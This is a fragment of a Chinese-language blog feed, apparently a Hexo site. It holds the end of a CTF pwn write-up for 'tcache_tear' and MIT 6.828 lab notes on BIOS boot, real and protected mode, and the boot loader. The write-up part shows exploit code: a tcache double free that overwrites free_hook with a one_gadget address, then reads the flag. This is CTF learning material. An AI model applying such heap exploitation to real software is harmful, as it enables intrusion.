class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x40</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.sendline(<span class="string">&#x27;cd home&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cd tcache_tear&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里就是个常规的菜单题，但是对于我来说一个不懂的点就是对于free掉的chunk的check，就是要还得检查当前chunk的nextchunk，然后这里的nextchunk的相关信息在nextchunk的nextchunk，所以伪造的时候要伪造3个。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;检查&quot;&gt;&lt;a href=&quot;#检查&quot; class=&quot;headerlink&quot; title=&quot;检查&quot;&gt;&lt;/a&gt;检查&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】Lab1-Exercise2</title>
    <link href="https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/"/>
    <id>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/</id>
    <published>2021-01-22T08:41:44.026Z</published>
    <updated>2021-01-23T08:51:53.959Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-1-Exercise-2："><a href="#Lab-1-Exercise-2：" class="headerlink" title="Lab 1 Exercise 2："></a>Lab 1 Exercise 2：</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>这里的练习是用gdb的’si’指令去调试并猜测它是做什么的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先我们看第一条指令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 0xffff0:  ljmp $0xf000, $0xe05b  </span><br></pre></td></tr></table></figure><p>​    这是运行的第一条指令，是一条跳转指令，跳转到0xfe05b地址处，至于这个地址是怎么算出来的，在讲义中已经说过了。我们首先需要知道，PC机启动时，CPU运行在实模式下，而当进入操作系统内核后，就会设计到页表等的知识，这是在保护模式下运行了。实模式是早期CPU，比如8088处理器的工作模式，这类处理器由于只有20根地址线，所以它们只能访问1MB的内存空间。但是CPU也在不断的发展，之后的80286/80386已经具备32位地址总线，能够访问4GB内存空间，为了能够很好的管理这么大的内存空间，保护模式被研发出来。所以现代处理器都是工作在保护模式下的。但是为了实现向后兼容，即原来运行在8088处理器上的软件仍然能在现代处理器上运行，所以现代的CPU都是在启动时运行与实模式，启动完成后运行与保护模式。BIOS就是PC刚启动时运行的软件，所以它必然工作在实模式。</p><p>至于这两种工作模式的原理，可自行谷歌</p><p>实模式下指令中出现的地址都是采用（段基址：段内偏移）的形式，其中这两个字段的值，通常是存放寄存器中的。其中段基址必须放在段寄存器中，包括CS(代码段), DS(数据段), SS(堆栈段), ES(扩展段)。不同的段寄存器存放的是你程序不同的段的起始地址。</p><p>但是由于8088CPU中寄存器都是16位，而CPU地址总线是20位的，我们怎么通过16位的寄存器去拼接20位的地址呢？所以我们需要采用下面的方法：<strong>把段寄存器中的值左移4位（也就是乘16），形成20位段基址，然后和16位段内偏移相加，就得到了真实地址。</strong>比如上面的指令中段寄存器的内容为0xf000，所以真实地址为 0xf000&lt;&lt;4+0xe05b = 0xfe05b。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 0xfe05b: cmpl $0x0, $cs:0x6ac8</span><br></pre></td></tr></table></figure><p>​    下一条指令，把0x0这个立即数和$cs:0x6ac8所代表的内存地址处的值所比较，<strong>至于为什么比较，俺不知道</strong>。其中$cs:0x6ac8就是我们刚刚介绍的实模式下地址形成的格式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. 0xfe062:  jne  0xfd2e1</span><br></pre></td></tr></table></figure><p>​    jne指令：如果ZF标志位为0的时候跳转，即上一条指令cmpl的结果不是0时跳转，也就是$cs:0x6ac8地址处的值不是0x0时跳转。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4. 0xfe066:  xor  %dx, %dx</span><br></pre></td></tr></table></figure><p>​    下条指令的地址是0xfe066，可见上面的跳转指令没有跳转。这条指令的功能是把dx寄存器清零。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5. 0xfe068:  mov  %dx %ss</span><br><span class="line">6. 0xfe06a:  mov  $0x7000, %esp</span><br><span class="line">7. 0xfe070:  mov  $0xf34d2, %edx</span><br><span class="line">8. 0xfe076:  jmp  0xfd15c</span><br><span class="line">9. 0xfd15c:  mov  %eax, %ecx</span><br></pre></td></tr></table></figure><p>​    接下来就是设置一些寄存器的值，<strong>具体含义俺不知道</strong>，注意第8条，进行了绝对跳转。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10. 0xfd15f:  cli</span><br></pre></td></tr></table></figure><p>​    <strong>关闭中断指令</strong>。这个比较好理解，启动时的操作是比较关键的，所以肯定是不能被中断的。这个关中断指令用于关闭那些可以屏蔽的中断。比如大部分硬件中断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11. 0xfd160:  cld</span><br></pre></td></tr></table></figure><p>​    设置方向标识(DF)为0，表示后续的串操作比如MOVS操作，内存地址的变化方向，如果为0代表从低地址值变为高地址。具体什么是串操作，自行谷歌。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12. 0xfd161:  mov  $0x8f, %eax</span><br><span class="line">13. 0xfd167:  out  %al, $0x70</span><br><span class="line">14. 0xfd169:  in  $0x71, %al</span><br></pre></td></tr></table></figure><p>​    这三个操作中涉及到两个新指令out，in。这两个操作用于操作IO端口的。这种IO端口的操作后续会经常接触到，这里大致说下。</p><p>​    CPU与外部设备通讯时，通常是通过访问、修改设备控制器中的寄存器来实现的。那么这些位于设备控制器中的寄存器也叫做<strong>IO端口</strong>。为了方便管理，80x86CPU采用IO端口单独编址的方式，即所有设备的端口都被命名到一个IO端口地址空间中。这个空间是独立于内存地址空间的。所以必须采用和访问内存的指令不一样的指令来访问端口。</p><p>​    所以这里引入in，out操作：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in %al，PortAddress向端口地址为PortAddress的端口写入值，值为al寄存器中的值</span><br><span class="line">out PortAddress，%al把端口地址为PortAddress的端口中的值读入寄存器al中</span><br></pre></td></tr></table></figure><p>​    <strong>标准规定端口操作必须要用al寄存器作为缓冲</strong></p><p>​    那么这三条指令就是要操作端口0x70，0x71，它们对应的是什么设备呢。根据下面的链接查询</p><p><a href="http://bochs.sourceforge.net/techspec/PORTS.LST">http://bochs.sourceforge.net/techspec/PORTS.LST</a></p><p>​    从中可以知道，0x70端口和0x71端口是用于控制系统中一个叫CMOS的设备，这个设备是一个低功耗的存储设备，它可以用于在计算机时存储一些信息，它是由独立的电池供电的。这里有详细介绍<a href="https://wiki.osdev.org/CMOS">https://wiki.osdev.org/CMOS</a></p><p>​    这个CMOS中可以控制跟PC相关的多个功能，其中最重要的就是<strong>时钟设备</strong>的，它还可以控制是否<strong>响应不可屏蔽中断</strong>。</p><p>​    操作CMOS存储器中的内容需要两个端口，一个是0x70另一个就是0x71。其中0x70可以叫做索引寄存器，<strong>这个8位寄存器是不可屏蔽中断（NMI）使能位。如果你把这个位置1，则NMI不会被响应。低七位用于指定CMOS存储器中的存储单元地址**</strong>，所以如果你想访问第1号存储单元，并且在访问时，我要使能NMI，那么你就应该向端口0x70里面送入10000001=0x81。</p><p>即</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x81, %al</span><br><span class="line">out %al, 0x70</span><br></pre></td></tr></table></figure><p>​    然后对于这个地址单元的操作，比如读或者写就可以由0x71端口完成，比如你现在想从1号存储单元里面读出它的值，在完成上面的两条指令后，就可以下面输入这条指令　</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in $0x71, %al </span><br></pre></td></tr></table></figure><p>​    再回到我们的系统，这三条指令可以看出，它首先关闭了NMI中断，并且要访问存储单元0xF的值，并且把值读到al中，但是在后面我们发现这个值并没有被利用，所以可以认为这三条指令是用来关闭NMI中断的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">15. 0xfd16b:  in  $0x92, %al</span><br><span class="line">16. 0xfd16d:  or  $0x2, %al</span><br><span class="line">17. 0xfd16f:  out  %al, $0x92</span><br></pre></td></tr></table></figure><p>​    这三步操作又是在控制端口，此时被控制的端口是0x92，通过上面的链接我们可以查到，它控制的是PS/2系统控制端口A，而第16，17步的操作明显是把这个端口的1号bit置为1。这个端口的bit1的功能是</p><p>​        <code>bit 1 = 1 indicates A20 active</code></p><p>​    即A20位，即第21个地址线被使能，了解过实模式和保护模式的肯定知道，如果A20地址线被激活，那么系统工作在保护模式下，但是在boot loader程序中，计算机首先要工作在实模式下。所以这里的操作应该是测试可用内存空间。在boot loader之前，它肯定还会转回实模式。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">18. 0xfd171:  lidtw  %cs:0x6ab8</span><br></pre></td></tr></table></figure><p>​    lidt指令：加载中断向量表寄存器（IDTR）。这个指令会把从地址0xf6ab8起始的后面6个字节的数据读入到中断向量表寄存器（IDTR）中。中断是操作系统中非常重要的一部分，有了中断操作系统才能真正实现进程。每一种中断都有自己对应的中断处理程序，那么这个中断的处理程序的首地址就叫做这个中断的中断向量。中断向量表自然是存放所有中断向量的表了。关于中断向量表的介绍，可以查看<a href="http://wiki.osdev.org/Interrupt_Descriptor_Table">http://wiki.osdev.org/Interrupt_Descriptor_Table</a> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">19. 0xfd177:  lgdtw  %cs:0x6a74</span><br></pre></td></tr></table></figure><p>​    把从0xf6a74为起始地址处的6个字节的值加载到全局描述符表格寄存器GDTR中。这个表是实现保护模式非常重要的一部分，我们在介绍boot loader时会具体介绍它。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">20. 0xfd17d:  mov  %cr0, %eax</span><br><span class="line">21. 0xfd180:  or  $0x1, %eax</span><br><span class="line">22. 0xfd184:  mov  %eax, %cr0</span><br></pre></td></tr></table></figure><p>​    计算机中包含<code>CR0 ~ CR3</code>四个控制寄存器，用来控制和确定处理器的操作模式。其中这三个语句的操作明显是要把CR0寄存器的最低位（0bit）置1。CR0寄存器的0bit是PE位，启动保护位，当该位被置1，代表开启了保护模式。但是这里出现了问题，我们刚刚说过BIOS是工作在实模式下，后面的boot loader开始的时候也是工作在实模式下，所以这里切换为保护模式，显然是自相矛盾。所以这里只能推测它在检测机器是否能工作在保护模式下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23. 0xfd187:  ljmpl $0x8, $0xfd18f</span><br><span class="line">24. 0xfd18f:  mov  $0x10, %eax</span><br><span class="line">25. 0xfd194:  mov  %eax, %ds</span><br><span class="line">26. 0xfd196:  mov  %eax, %es</span><br><span class="line">27. 0xfd198:  mov  %eax, %ss</span><br><span class="line">28. 0xfd19a:  mov  %eax, %fs</span><br><span class="line">29. 0xfd19c:  mov  %eax, %gs</span><br></pre></td></tr></table></figure><p>这里的23~29步之所以这么做是按照规定来的，<a href="https://en.wikibooks.org/wiki/X86_Assembly/Global_Descriptor_Table">https://en.wikibooks.org/wiki/X86_Assembly/Global_Descriptor_Table</a> 链接中指出，要完成加载GDTR的过程需要重新加载段寄存器，即如果刚刚加载完GDTR寄存器我们必须要重新加载所有的段寄存器的值，而其中CS段寄存器必须通过长跳转指令，即23号指令来进行加载。所以这些步骤是在第19步完成后必须要做的。这样才能是GDTR的值生效。</p><p>目前只能分析到这里。</p><h2 id="Appendix：实模式和保护模式"><a href="#Appendix：实模式和保护模式" class="headerlink" title="Appendix：实模式和保护模式"></a>Appendix：实模式和保护模式</h2><p>首先我们要知道这两种模式都是CPU的工作模式，实模式是早期CPU运行的工作模式，而保护模式则是现代CPU运行的模式。但是为什么现代CPU在运行boot loader时仍旧要先进入实模式呢？就是为了实现软件的向后兼容性不得已才这样的。</p><p>下面我们分别看下这两种工作模式的基本原理。</p><p><strong>实模式</strong></p><p>实模式出现于早期8086CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采用一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：（段基址：段偏移量）</p><p>其中第一个字段是段基址，它的值是由段寄存器提供的。段寄存器有4种，%cs，%ds，%ss，%es。具体这个指令采用哪个段寄存器是由这个指令的类型来决定的。比如要取指令就是采用%cs寄存器，要读取或者写入数据就用%ds寄存器。总之，不管什么指令，都会有一个段寄存器提供一个16位的段基址。</p><p>第二个字段是段内偏移量，代表你要访问的这个内存地址距离这个段基址的距离。它的值就是由通用寄存器来提供的，所以也是16位。那么问题来了：两个16位的值如何组合成一个20位的地址呢？这里采用的方式是把段寄存器所提供的段基址先向左移4位。这样就变成了一个20位的值，然后再与段偏移量相加。所以公式如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">物理地址 &#x3D; 段基址 &lt;&lt; 4 + 段内偏移</span><br></pre></td></tr></table></figure><p>以上就是实模式访问内存地址的原理。</p><p><strong>保护模式</strong></p><p>随着CPU的发展，CPU的地址线的个数从原来的20根变成了现在的32根，所以可以访问的内存空间从1MB变成了现在的4GB，寄存器的位数也变成了32位。所以实模式下的内存地址计算方式就已经不再适合了。所以就引入了现在的保护模式，实现更大的空间，更灵活的内存访问。</p><p>在介绍保护模式的工作原理之前，先介绍几个容易混淆的概念。逻辑地址，虚拟地址，线性地址，物理地址。</p><p>我们都知道，如今在编写程序时，程序是运行在虚拟地址空间下的，也就是说，在程序员编写程序时指令中出现的地址并不一定是这个程序在内存中运行时真正要访问的内存地址。这样做的目的是为了能够让程序员在编程时不需要之间操作真实地址，并且如果能够之间操作物理地址，肯定是不安全的，因为当它在真实运行时，内存中各个程序的分布情况是不可能在编写程序时就知道的。所以这个程序的这条指令到底要访问哪个内存单元是由操作系统来确定的。所以这就是一个<strong>虚拟地址</strong>到真实主存中物理地址的转换。</p><p>那么<strong>逻辑地址</strong>又是什么呢？根据上面我们知道，程序员编写时看到的是虚拟地址，但是并不是说程序员直接把这个虚拟地址写道指令中的。它是由逻辑地址推导得到的。所以指令中真实出现的是逻辑地址，一个逻辑地址由两部分组成，一个是段选择子，一个是段内偏移。而且采用哪个段选择子通常也是在指令中隐含的，程序员通常只需要指明段内偏移量。然后分段管理机构会把逻辑地址转换为线性地址。如果该机器没用采用分页机制的话，此时的线性地址就是最后的主存物理地址。但是如果机器中还有分页设备的话，比如内存大小实际只有1G，但是根据前面我们知道可访问的空间有4G。所以此时还需要分页机构把线性地址转化为最终的真实物理地址。所以可见虚拟地址和线性地址的含义是差不多的。我们可以在下图中看到我们上面叙述的地址转换过程。在boot loader中，并没有分页机制。所以计算出来的线性地址就是真实要访问的主存地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13072026781/0" alt="image-20210119215131791"></p><p>那么在保护模式下我们是如何最终的物理地址的呢？</p><p>首先，在计算机中存在两个表，GDT，LDT。它们两个其实是同类型的表，前者叫做全局段描述符表，后者叫做本地段描述符表。他们都是用来存放关于某个运行在内存中的程序的分段信息的。比如某个程序的代码段是从哪里开始的，有多大；数据段又是从哪里开始的，又多大。GDT表全局可见，也就是说每一个运行在内存中的程序都能看到这个表。所以操作系统内核程序的段信息就存在这里面。还有一个LDT表，这个表是每一个在内存中的程序都包含的，里面指明了每一个程序的段信息。我们可以看一下这两个表的结构，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13072027516/0" alt="image-20210119215630208"></p><p>我们从图中可以看到，无论是GDT，还是LDT。每一个表项都包含三个字段：</p><ol><li>Base：32位，代表这个程序的这个段的基地址。</li><li>Limit：20位，代表这个程序的这个段的大小。</li><li>Flags：12位，代表这个程序的这个段的访问权限。</li></ol><p>当程序中给出逻辑地址（segment：offset）时，它不像实模式那样，用segment的值做段基址。而是把这个segment的值作为一个selector，代表这个段的段表项在GDT/LDT表的索引。比如你要访问的地址是segment：offset = 0x01：0x0000ffff，此时由于每个段表项的长度位8，所以应该取出地址8（索引为1）处的段表项。然后首先根据Flags字段来判断是否可以访问这个段的内容，这样做是为了能够实现进程间地址的保护。如果能够访问，则把Base字段的内容取出，直接与offset相加，就得到线性地址了。之后就是要根据是否有分页机制来进行地址转换了。</p><p>比如当前Base字段的值是0x00f0000，则最后线性地址的值为0x00fffff。</p><p>以上就是保护模式下内存地址的计算方法。</p><p>综上，通过上面的叙述可见，保护模式要比实模式灵活许多：</p><ol><li>实模式下段基址必须是16的整数倍，保护模式下段基址可以是4GB空间内的任意一个地址。</li><li>实模式下段的长度为65536，但是保护模式下段的长度也是可以达到4GB的。</li><li>保护模式下可以对内存的访问多加一层保护，但是实模式没有。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Lab-1-Exercise-2：&quot;&gt;&lt;a href=&quot;#Lab-1-Exercise-2：&quot; class=&quot;headerlink&quot; title=&quot;Lab 1 Exercise 2：&quot;&gt;&lt;/a&gt;Lab 1 Exercise 2：&lt;/h2&gt;&lt;h3 id=&quot;任务&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】JOS学习笔记 Lab1</title>
    <link href="https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/"/>
    <id>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/</id>
    <published>2021-01-22T08:41:44.019Z</published>
    <updated>2021-03-17T05:19:19.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><h3 id="The-PC’s-Physical-Address-Space"><a href="#The-PC’s-Physical-Address-Space" class="headerlink" title="The PC’s Physical Address Space"></a>The PC’s Physical Address Space</h3><p>这一节我们深入探讨PC到底是如何启动的。首先看下通常一个PC的物理地址空间是如何布局：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB) </span><br><span class="line">|      32-bit      | </span><br><span class="line">|  memory mapped   | </span><br><span class="line">|     devices      | </span><br><span class="line">|                  | </span><br><span class="line">&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\ </span><br><span class="line">&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\ </span><br><span class="line">|                  | </span><br><span class="line">|      Unused      | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- depends on amount of RAM </span><br><span class="line">|                  | </span><br><span class="line">|                  | </span><br><span class="line">| Extended Memory  | </span><br><span class="line">|                  | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB) </span><br><span class="line">|     BIOS ROM     | </span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB) </span><br><span class="line">|  16-bit devices, | </span><br><span class="line">|  expansion ROMs  | </span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB) </span><br><span class="line">|   VGA Display    | </span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB) </span><br><span class="line">|                  | </span><br><span class="line">|    Low Memory    | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><p>这张图仅仅展示了内存空间的一部分。</p><p>第一代PC处理器是16位字长的Inter 8088处理器，这类处理器只能访问1MB的内存空间。早期的PC的物理地址空间是从<code>0x00000000</code>开始，但从<code>0x000FFFFF</code>而不是<code>0xFFFFFFFF</code>结束，即<code>0x00000000 ~ 0x000FFFFF</code>。但是这1MB的空间也不是用户都能利用到的，只有低640KB（<code>0x00000000 ~ 0x000A0000</code>）的地址空间是用户程序可以使用的。即只有标记位 “Low Memory”的640KB空间是早期的PC唯一可以使用的随机存器存储器（RAM）。如图所示。</p><p>而剩下的384KB（<code>0x000A0000 ~ 0x000FFFFF</code>）的高地址空间则被保留用作其他的目的，比如（<code>0x000A0000 ~ 0x000C0000</code>）被用作屏幕显示内容缓冲区，其他的则被非易失性存储器（ROM）所使用。其中最重要的一部分就是基本输入/输出系统（BIOS），占据了<code>0x000F0000 ~ 0x00100000</code> 的地址空间。BIOS负责进行一些基本的系统初始化任务，比如开启显卡，检测该系统的内存大小等等工作。在初始化完成后，BIOS就会从某个适当的地方（比如软盘，硬盘，CD-ROM或者网络）加载操作系统，并将计算机的控制权交给操作系统。</p><p>虽然Inter处理器突破了1MB内存空间，在80286和80386上已经实现了16MB，4GB的地址空间，但是PC的架构必须仍旧把原来的1MB的地址空间的结构保留下来，这样才能实现向后兼容。所以现代计算机的地址<code>0x000A0000 ~ 0x00100000</code>区间是一个空洞，不会被使用。因此这个空洞就把地址空间划分成了两部分，第一部分就是从<code>0x00000000 ~ 0x000A0000</code>，叫做传统内存。剩下的不包括空洞的其他部分叫做扩展内存。而对于这种32位字长处理器通常把BIOS存放到整个存储空间的顶端处。</p><p>由于xv6操作系统设计的一些限制，它只利用256MB的物理地址空间，即它假设用户的主机只有256MB的内存。</p><h3 id="The-ROM-BIOS"><a href="#The-ROM-BIOS" class="headerlink" title="The ROM BIOS"></a>The ROM BIOS</h3><p>现在我们利用qemu和gdb去探索PC机的启动过程。首先看一下如何利用这两个软件来实现对操作系统的debug。</p><p>首先我们在lab目录下打开终端输入 <code>make qemu-gdb</code> 后，再打开一个终端输入 <code>make gdb</code> 显示如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13071972822/0" alt="image-20210119162235532"></p><p>这样其实我们就可以开始调试了<del>~</del> 芜湖！</p><p>我们可以看到下面那一行：</p><p><code>[f000:fff0]  0xffff0: ljmp  $0xf000, $0xe05b</code></p><p>这条指令就是整个PC加电启动后，执行BIOS的第一条指令。</p><ul><li>PC从物理地址0x000ffff0开始执行，该地址位于ROM BIOS保留的64KB区域的最顶部。</li><li>PC从CS = 0xf000 和 IP = 0xfff0 开始执行。</li><li>要执行的第一条指令是跳转指令，它跳转到CS = 0xf000 和 IP = 0xe05b 开始执行。</li></ul><p>为什么QEMU要这样启动或者说PC启动是这样的。因为PC中的BIOS是”硬连线”到物理地址范围<code>0x000f0000 ~ 0x000fffff</code>，也就是说这是一种硬性的规定，在加电后就是必须且一定在0x000ffff0这个地方开始执行BIOS的第一条指令，即加电后CS = 0xf000 ，IP = 0xfff0。这样设计可以确保BIOS在加电或任何系统重新启动后始终首先控制计算机，至于为什么我们稍后了解。</p><p>QEMU带有自己的BIOS，它将其放置在处理器的模拟物理地址空间中的此位置，处理器复位后，此时进入实模式，并将CS设置为0xf000，将IP设置为0xfff0，以便从该段（CS:IP）开始执行。那么逻辑地址<code>0xf000：0xfff0</code> 是如何变成物理地址的？</p><p>实模式下的地址转换公式为：<code>16 * segment + offset</code></p><p>也就是 <code>0xf000 * 16  + 0xfff0 = 0x000ffff0</code></p><p>这里我们发现其实0xffff0与BOIS的结尾处0x100000只相差了16个字节，所以这里所作的第一件事就是jmp到BIOS中的较前的位置，毕竟仅仅16字节能完成多少工作？</p><p>综上，我们可以知道BIOS的操作就是在控制，初始化，检测各种底层的设备，比如时钟，GDTR寄存器，以及设置中断向量表等等。作为PC通电后运行的第一段程序，<strong>它最重要的功能是把操作系统从磁盘中导入内存，然后再把控制器交给操作系统。</strong>所以BIOS在运行的最后会去检测可以从当前系统的哪个设备中找到操作系统，通常来说是我们的磁盘，也有可能是U盘等等。等BIOS确定了，操作系统位于磁盘中，那么它就会把这个磁盘的第一个扇区，通常把它叫做启动区（boot sector）先加载到内存中，这个启动区中包括一个非常重要的程序 —– boot loader，它会负责完成整个操作系统从磁盘导入内存的工作，以及一些其他的非常重要的配置工作。最后操作系统才会开始运行。</p><p>所以PC启动后的运行顺序是 ：BIOS -&gt; boot loader -&gt; 操作系统内核</p><h2 id="Part-2-The-Boot-Loader"><a href="#Part-2-The-Boot-Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>PC的硬盘和软盘都可以划分一个个大小为512字节的区域，叫做扇区。一个扇区是一次磁盘操作的最小粒度。每一次读取或者写入操作都必须是一个或多个扇区。如果一个磁盘是可以被用来启动操作系统的，就把这个磁盘的第一个扇区叫做启动扇区。这一部分介绍的boot loader程序就位于这个启动扇区中。当BIOS找到一个可以启动的软盘或硬盘后，它就会把这512字节的启动扇区加载到内存地址<code>0x7c00 ~ 0x7dff</code>这个区域内，然后BIOS将CPU的控制权交给boot loader。</p><p>对于我们的课程6.828，我们将采用传统的硬盘启动机制，这就意味着我们的boot loader的大小必须小于512字节。整个boot loader是由一个汇编文件（<code>boot/boot.S</code>）以及一个C语言文件（<code>boot/main.c</code>）。boot loader必须完成两个主要的任务。</p><ol><li>首先，boot loader把处理器从实模式转换为32bit的保护模式，只有在这种模式下软件可以访问超过1MB空间的内容。</li><li>boot loader可以通过使用x86的特定的IO指令，直接访问IDE磁盘设备存储器，从磁盘读取内核。</li></ol><p>简单概括就是进保护模式，然后读内核。对于boot loader来说，有一个文件很重要（<code>obj/boot/boot.asm</code>）。这个文件是我们真实运行的boot loader程序的反汇编版本。所以我们可以把它和它的源代码即<code>boot.S</code>和<code>main.c</code>比较一下。</p><p>此处出门右转Lab1-Exercise3</p><p>回答下文章内提出的四个问题：</p><ol><li><p><strong>处理器是在上面时候开始运行于32bit模式？到底是什么把CPU从16位切换为32位工作模式？</strong></p><p>在boot.S文件中，计算机首先工作于实模式，此时是16bit工作模式。当运行完<code>ljmp    $PROT_MODE_CSEG, $protcseg</code>这条语句后，正式进入32位工作模式。</p></li><li><p><strong>boot loader中执行的最后一条语句是什么？内核被加载到内存中执行的第一条语句又是什么？</strong></p><p>boot loader执行的最后一条语句是bootmain子程序中的最后一条语句<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>，也就是跳转到操作系统内核文件的第一条指令的起始虚拟地址处。第一条指令位于/kern/entry.S文件中，第一句是<code>movw   $0x1234,0x472</code></p></li><li><p><strong>内核的第一条指令在哪里？</strong></p><p>位于/kern/entry.S中</p></li><li><p><strong>boot loader是如何知道它要读取多少个扇区才能把整个内核都送入内存的呢？在哪里找到这些信息？</strong></p><p>首先关于操作系统一共有多少个段，每个段又有多少个扇区的信息位于操作系统文件中的Program Header Table中。这个表中的每个表项分别对应操作系统的一个段。并且每个表项的内容包括这个段的大小，段起始地址偏移等等信息。所以如果我们能够找到这个表，那么就能够通过表项所提供的信息来确定内核占用的扇区。在操作系统内核映像文件的ELF头部信息中。</p></li></ol><h3 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h3><p>现在我们进一步讨论一下boot loader中的C部分。为了能够理解boot/main.c程序，你必须首先清楚什么是ELF文件。当在编译并且链接了像JOS内核这样的C语言程序后，编译器会把C语言源文件（.c后缀）转换为目标文件（.o后缀）。目标文件中包含的是机器能够直接执行的机器指令。链接器在把所有的目标文件组合成一个单独的二进制映像，比如obj/kern/kernel。这类二进制映像文件就是ELF格式的。</p><p>在6.828中，可以认为一个可执行的ELF文件由三大部分组成：一个是带有加载信息的文件头，然后紧跟着程序段表，然后紧跟着就是几个程序段。其中每一个段都是一块连续的代码或数据。它们在被运行时要首先加载到内存中。boot 